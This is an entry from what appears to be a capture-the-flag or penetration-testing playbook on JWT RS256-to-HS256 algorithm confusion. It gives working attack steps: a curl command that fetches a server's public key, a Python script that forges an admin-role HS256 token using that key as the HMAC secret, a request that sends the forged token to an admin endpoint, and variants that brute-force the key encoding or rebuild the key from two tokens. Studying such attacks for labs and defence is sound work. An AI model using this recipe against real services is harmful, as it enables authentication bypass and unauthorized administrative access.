---
id: jwt-rs256-hs256-key-confusion
category: WEB
tags: [jwt, rs256, hs256, algorithm-confusion, key-confusion, asymmetric-to-symmetric, public-key-as-hmac-secret, jwt-forge, pubkey, jwks, token-forge]
tools: []
manuals: []
title: "JWT RS256→HS256 confusion: sign with the public key as the HMAC secret"
difficulty: hard
created: 2026-11-23
updated: 2026-11-23
related: [jwt-alg-none, flask-weak-secret-session-forge, sha256-length-extension-forge]
---

## How to recognize this pattern

- Tokens are issued **RS256** (asymmetric: server signs with its private key, verifies with its public
  key), but the verification code reads the algorithm **from the token header** instead of pinning it.
- The **public key is obtainable**: a `/pubkey` or `/jwks.json` endpoint, a `.well-known/jwks`, a PEM in
  static files, or recoverable from two tokens. Public ⇒ not a secret.
- The trick: switch the header to **HS256** and sign with the **public key bytes as the HMAC secret**.
  The server, trusting the header, verifies HS256 using *its public key* as the shared secret — which
  you now also know.

## Method

### 1. Get the exact public key bytes
```bash
curl -s https://target/pubkey -o pub.pem        # or /jwks.json → reconstruct the PEM
```
Use the key **exactly** as the server stores it for verification — usually the full PEM including
`-----BEGIN PUBLIC KEY-----`, trailing newline and all. This byte-for-byte match is the crux.

### 2. Forge an HS256 token signed with that PEM
Modern PyJWT refuses a public key as an HMAC secret, so sign by hand:
```bash
python3 - <<'PY' > token.txt
import hmac, hashlib, base64, json
b = lambda d: base64.urlsafe_b64encode(d).rstrip(b"=")
head = b(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
body = b(json.dumps({"user":"marc_v","role":"admin"}).encode())
sig  = hmac.new(open("pub.pem","rb").read(), head + b"." + body, hashlib.sha256).digest()
print((head + b"." + body + b"." + b(sig)).decode())
PY
curl -s https://target/admin -H "Authorization: Bearer $(cat token.txt)"
```

### 3. If the exact PEM form is unknown, brute the representation
Verification libraries differ in whether they feed the PEM with/without the trailing newline, DER vs
PEM, with/without the `BEGIN` armor. Try each variant:
```python
for key in [pem, pem.rstrip(b"\n"), pem + b"\n", der_bytes]:
    # sign and test against the server
```
`jwt_tool` automates this: `python3 jwt_tool.py <token> -X k -pk pub.pem` (algorithm-confusion mode).

### 4. Recover the public key from two tokens (no endpoint)
With two RS256 tokens you can compute the RSA modulus `n` (GCD of the two forgeable relations); tools
like `rsa_sign2n` reconstruct the public key, after which step 2 applies.

## Gotchas

- The **secret is the public key bytes**, in whatever encoding the verifier uses — this is where it
  usually fails. Try PEM-with-newline first, then the other forms (step 3).
- Works only when the server **accepts the header's alg** for verification. If it pins `algorithms=["RS256"]`,
  this is dead — fall back to `jwt-alg-none` or a weak-secret HS256 crack.
- Don't confuse with plain weak-HS256: that's brute-forcing a short symmetric secret (`hashcat -m 16500`).
  Confusion needs **no** brute of the secret — the secret is public.
- Keep other claims (`exp`, `iss`, `kid`) valid; a forged-but-expired token still fails.

## Cross-reference

- `jwt-alg-none`: try first — cheaper signature bypass; this is the next vector when `none` is rejected.
- `flask-weak-secret-session-forge`: weak-symmetric-secret sibling (crack, don't confuse).
- `sha256-length-extension-forge`: another "forge a signature without the private secret" primitive.
